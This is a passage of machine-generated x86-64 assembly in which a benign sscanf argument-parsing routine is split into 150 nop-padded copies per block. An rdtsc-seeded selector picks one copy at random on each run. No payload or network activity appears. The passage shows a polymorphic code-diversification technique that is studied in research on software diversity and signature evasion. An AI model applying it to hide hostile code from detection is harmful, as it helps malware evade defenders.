	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 119
.Lmain_win5_var119:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 120
.Lmain_win5_var120:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 121
.Lmain_win5_var121:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 122
.Lmain_win5_var122:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 123
.Lmain_win5_var123:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 124
.Lmain_win5_var124:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	nop
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 125
.Lmain_win5_var125:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	nop
	nop
	jmp	.Lmain_win5_continue
## Variant 126
.Lmain_win5_var126:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 127
.Lmain_win5_var127:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 128
.Lmain_win5_var128:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 129
.Lmain_win5_var129:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 130
.Lmain_win5_var130:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 131
.Lmain_win5_var131:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 132
.Lmain_win5_var132:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 133
.Lmain_win5_var133:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 134
.Lmain_win5_var134:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 135
.Lmain_win5_var135:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 136
.Lmain_win5_var136:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 137
.Lmain_win5_var137:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
	nop
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 138
.Lmain_win5_var138:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 139
.Lmain_win5_var139:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 140
.Lmain_win5_var140:
	popq	%rax
	nop
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 141
.Lmain_win5_var141:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 142
.Lmain_win5_var142:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	nop
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 143
.Lmain_win5_var143:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	jmp	.Lmain_win5_continue
## Variant 144
.Lmain_win5_var144:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 145
.Lmain_win5_var145:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	nop
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 146
.Lmain_win5_var146:
	popq	%rax
	cmpl	$2, -24(%rbp)
	nop
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 147
.Lmain_win5_var147:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	nop
	nop
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
## Variant 148
.Lmain_win5_var148:
	popq	%rax
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
	nop
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	nop
	nop
	jmp	.Lmain_win5_continue
## Variant 149
.Lmain_win5_var149:
	popq	%rax
	nop
	cmpl	$2, -24(%rbp)
	jl	LBB2_6
## %bb.5:
	movq	-32(%rbp), %rax
	movq	8(%rax), %rdi
	leaq	L_.str.1(%rip), %rsi
	leaq	-36(%rbp), %rdx
	jmp	.Lmain_win5_continue
.Lmain_win5_continue:
	movb	$0, %al
	callq	_sscanf
LBB2_6:
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win4_var0
	cmpl	$1, %eax
	je	.Lmain_win4_var1
	cmpl	$2, %eax
	je	.Lmain_win4_var2
	cmpl	$3, %eax
	je	.Lmain_win4_var3
	cmpl	$4, %eax
	je	.Lmain_win4_var4
	cmpl	$5, %eax
	je	.Lmain_win4_var5
	cmpl	$6, %eax
	je	.Lmain_win4_var6
	cmpl	$7, %eax
	je	.Lmain_win4_var7
	cmpl	$8, %eax
	je	.Lmain_win4_var8
	cmpl	$9, %eax
	je	.Lmain_win4_var9
	cmpl	$10, %eax
	je	.Lmain_win4_var10
	cmpl	$11, %eax
	je	.Lmain_win4_var11
	cmpl	$12, %eax
	je	.Lmain_win4_var12
	cmpl	$13, %eax
	je	.Lmain_win4_var13
	cmpl	$14, %eax
	je	.Lmain_win4_var14
	cmpl	$15, %eax
	je	.Lmain_win4_var15
	cmpl	$16, %eax
	je	.Lmain_win4_var16
	cmpl	$17, %eax
	je	.Lmain_win4_var17
	cmpl	$18, %eax
	je	.Lmain_win4_var18
	cmpl	$19, %eax
	je	.Lmain_win4_var19
	cmpl	$20, %eax
	je	.Lmain_win4_var20
	cmpl	$21, %eax
	je	.Lmain_win4_var21
	cmpl	$22, %eax
	je	.Lmain_win4_var22
	cmpl	$23, %eax
	je	.Lmain_win4_var23
	cmpl	$24, %eax
	je	.Lmain_win4_var24
	cmpl	$25, %eax
	je	.Lmain_win4_var25
	cmpl	$26, %eax
	je	.Lmain_win4_var26
	cmpl	$27, %eax
	je	.Lmain_win4_var27
	cmpl	$28, %eax
	je	.Lmain_win4_var28
	cmpl	$29, %eax
	je	.Lmain_win4_var29
	cmpl	$30, %eax
	je	.Lmain_win4_var30
	cmpl	$31, %eax
	je	.Lmain_win4_var31
	cmpl	$32, %eax
	je	.Lmain_win4_var32
	cmpl	$33, %eax
	je	.Lmain_win4_var33
	cmpl	$34, %eax
	je	.Lmain_win4_var34
	cmpl	$35, %eax
	je	.Lmain_win4_var35
	cmpl	$36, %eax
	je	.Lmain_win4_var36
	cmpl	$37, %eax
	je	.Lmain_win4_var37
	cmpl	$38, %eax
	je	.Lmain_win4_var38
	cmpl	$39, %eax
	je	.Lmain_win4_var39
	cmpl	$40, %eax
	je	.Lmain_win4_var40
	cmpl	$41, %eax
	je	.Lmain_win4_var41
	cmpl	$42, %eax
	je	.Lmain_win4_var42
	cmpl	$43, %eax
	je	.Lmain_win4_var43
	cmpl	$44, %eax
	je	.Lmain_win4_var44
	cmpl	$45, %eax
	je	.Lmain_win4_var45
	cmpl	$46, %eax
	je	.Lmain_win4_var46
	cmpl	$47, %eax
	je	.Lmain_win4_var47
	cmpl	$48, %eax
	je	.Lmain_win4_var48
	cmpl	$49, %eax
	je	.Lmain_win4_var49
	cmpl	$50, %eax
	je	.Lmain_win4_var50
	cmpl	$51, %eax
	je	.Lmain_win4_var51
	cmpl	$52, %eax
	je	.Lmain_win4_var52
	cmpl	$53, %eax
	je	.Lmain_win4_var53
	cmpl	$54, %eax
	je	.Lmain_win4_var54
	cmpl	$55, %eax
	je	.Lmain_win4_var55
	cmpl	$56, %eax
	je	.Lmain_win4_var56
	cmpl	$57, %eax
	je	.Lmain_win4_var57
	cmpl	$58, %eax
	je	.Lmain_win4_var58
	cmpl	$59, %eax
	je	.Lmain_win4_var59
	cmpl	$60, %eax
	je	.Lmain_win4_var60
	cmpl	$61, %eax
	je	.Lmain_win4_var61
	cmpl	$62, %eax
	je	.Lmain_win4_var62
	cmpl	$63, %eax
	je	.Lmain_win4_var63
	cmpl	$64, %eax
	je	.Lmain_win4_var64
	cmpl	$65, %eax
	je	.Lmain_win4_var65
	cmpl	$66, %eax
	je	.Lmain_win4_var66
	cmpl	$67, %eax
	je	.Lmain_win4_var67
	cmpl	$68, %eax
	je	.Lmain_win4_var68
	cmpl	$69, %eax
	je	.Lmain_win4_var69
	cmpl	$70, %eax
	je	.Lmain_win4_var70
	cmpl	$71, %eax
	je	.Lmain_win4_var71
	cmpl	$72, %eax
	je	.Lmain_win4_var72
	cmpl	$73, %eax
	je	.Lmain_win4_var73
	cmpl	$74, %eax
	je	.Lmain_win4_var74
	cmpl	$75, %eax
	je	.Lmain_win4_var75
	cmpl	$76, %eax
	je	.Lmain_win4_var76
	cmpl	$77, %eax
	je	.Lmain_win4_var77
	cmpl	$78, %eax
	je	.Lmain_win4_var78
	cmpl	$79, %eax
	je	.Lmain_win4_var79
	cmpl	$80, %eax
	je	.Lmain_win4_var80
	cmpl	$81, %eax
	je	.Lmain_win4_var81
	cmpl	$82, %eax
	je	.Lmain_win4_var82
	cmpl	$83, %eax
	je	.Lmain_win4_var83
	cmpl	$84, %eax
	je	.Lmain_win4_var84
	cmpl	$85, %eax
	je	.Lmain_win4_var85
	cmpl	$86, %eax
	je	.Lmain_win4_var86
	cmpl	$87, %eax
	je	.Lmain_win4_var87
	cmpl	$88, %eax
	je	.Lmain_win4_var88
	cmpl	$89, %eax
	je	.Lmain_win4_var89
	cmpl	$90, %eax
	je	.Lmain_win4_var90
	cmpl	$91, %eax
	je	.Lmain_win4_var91
	cmpl	$92, %eax
	je	.Lmain_win4_var92
	cmpl	$93, %eax
	je	.Lmain_win4_var93
	cmpl	$94, %eax
	je	.Lmain_win4_var94
	cmpl	$95, %eax
	je	.Lmain_win4_var95
	cmpl	$96, %eax
	je	.Lmain_win4_var96
	cmpl	$97, %eax
	je	.Lmain_win4_var97
	cmpl	$98, %eax
	je	.Lmain_win4_var98
	cmpl	$99, %eax
	je	.Lmain_win4_var99
	cmpl	$100, %eax
	je	.Lmain_win4_var100
	cmpl	$101, %eax
	je	.Lmain_win4_var101
	cmpl	$102, %eax
	je	.Lmain_win4_var102
	cmpl	$103, %eax
	je	.Lmain_win4_var103
	cmpl	$104, %eax
	je	.Lmain_win4_var104
	cmpl	$105, %eax
	je	.Lmain_win4_var105
	cmpl	$106, %eax
	je	.Lmain_win4_var106
	cmpl	$107, %eax
	je	.Lmain_win4_var107
	cmpl	$108, %eax
	je	.Lmain_win4_var108
	cmpl	$109, %eax
	je	.Lmain_win4_var109
	cmpl	$110, %eax
	je	.Lmain_win4_var110
	cmpl	$111, %eax
	je	.Lmain_win4_var111
	cmpl	$112, %eax
	je	.Lmain_win4_var112
	cmpl	$113, %eax
	je	.Lmain_win4_var113
	cmpl	$114, %eax
	je	.Lmain_win4_var114
	cmpl	$115, %eax
	je	.Lmain_win4_var115
	cmpl	$116, %eax
	je	.Lmain_win4_var116
	cmpl	$117, %eax
	je	.Lmain_win4_var117
	cmpl	$118, %eax
	je	.Lmain_win4_var118
	cmpl	$119, %eax
	je	.Lmain_win4_var119
	cmpl	$120, %eax
	je	.Lmain_win4_var120
	cmpl	$121, %eax
	je	.Lmain_win4_var121
	cmpl	$122, %eax
	je	.Lmain_win4_var122
	cmpl	$123, %eax
	je	.Lmain_win4_var123
	cmpl	$124, %eax
	je	.Lmain_win4_var124
	cmpl	$125, %eax
	je	.Lmain_win4_var125
	cmpl	$126, %eax
	je	.Lmain_win4_var126
	cmpl	$127, %eax
	je	.Lmain_win4_var127
	cmpl	$128, %eax
	je	.Lmain_win4_var128
	cmpl	$129, %eax
	je	.Lmain_win4_var129
	cmpl	$130, %eax
	je	.Lmain_win4_var130
	cmpl	$131, %eax
	je	.Lmain_win4_var131
	cmpl	$132, %eax
	je	.Lmain_win4_var132
	cmpl	$133, %eax
	je	.Lmain_win4_var133
	cmpl	$134, %eax
	je	.Lmain_win4_var134
	cmpl	$135, %eax
	je	.Lmain_win4_var135
	cmpl	$136, %eax
	je	.Lmain_win4_var136
	cmpl	$137, %eax
	je	.Lmain_win4_var137
	cmpl	$138, %eax
	je	.Lmain_win4_var138
	cmpl	$139, %eax
	je	.Lmain_win4_var139
	cmpl	$140, %eax
	je	.Lmain_win4_var140
	cmpl	$141, %eax
	je	.Lmain_win4_var141
	cmpl	$142, %eax
	je	.Lmain_win4_var142
	cmpl	$143, %eax
	je	.Lmain_win4_var143
	cmpl	$144, %eax
	je	.Lmain_win4_var144
	cmpl	$145, %eax
	je	.Lmain_win4_var145
	cmpl	$146, %eax
	je	.Lmain_win4_var146
	cmpl	$147, %eax
	je	.Lmain_win4_var147
	cmpl	$148, %eax
	je	.Lmain_win4_var148
	cmpl	$149, %eax
	je	.Lmain_win4_var149
	jmp	.Lmain_win4_var0
## Variant 0
.Lmain_win4_var0:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 1
.Lmain_win4_var1:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 2
.Lmain_win4_var2:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 3
.Lmain_win4_var3:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 4
.Lmain_win4_var4:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 5
.Lmain_win4_var5:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 6
.Lmain_win4_var6:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 7
.Lmain_win4_var7:
	popq	%rax
	nop
	nop
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 8
.Lmain_win4_var8:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 9
.Lmain_win4_var9:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	nop
	jmp	.Lmain_win4_continue
## Variant 10
.Lmain_win4_var10:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 11
.Lmain_win4_var11:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 12
.Lmain_win4_var12:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 13
.Lmain_win4_var13:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 14
.Lmain_win4_var14:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 15
.Lmain_win4_var15:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 16
.Lmain_win4_var16:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 17
.Lmain_win4_var17:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 18
.Lmain_win4_var18:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 19
.Lmain_win4_var19:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 20
.Lmain_win4_var20:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	nop
	nop
	nop
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 21
.Lmain_win4_var21:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 22
.Lmain_win4_var22:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 23
.Lmain_win4_var23:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 24
.Lmain_win4_var24:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 25
.Lmain_win4_var25:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 26
.Lmain_win4_var26:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	nop
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 27
.Lmain_win4_var27:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 28
.Lmain_win4_var28:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	nop
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 29
.Lmain_win4_var29:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 30
.Lmain_win4_var30:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	nop
	jmp	.Lmain_win4_continue
## Variant 31
.Lmain_win4_var31:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 32
.Lmain_win4_var32:
	popq	%rax
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
	nop
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 33
.Lmain_win4_var33:
	popq	%rax
	nop
	cmpl	$4, -24(%rbp)
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 34
.Lmain_win4_var34:
	popq	%rax
	cmpl	$4, -24(%rbp)
	nop
	jl	LBB2_8
## %bb.7:
	movq	-32(%rbp), %rax
	movq	16(%rax), %rdi
	leaq	L_.str.2(%rip), %rsi
	nop
	leaq	-48(%rbp), %rdx
	jmp	.Lmain_win4_continue
## Variant 35
.Lmain_win4_var35:
	popq	%rax
	nop
	nop
	cmpl	$4, -24(%rbp)
	nop
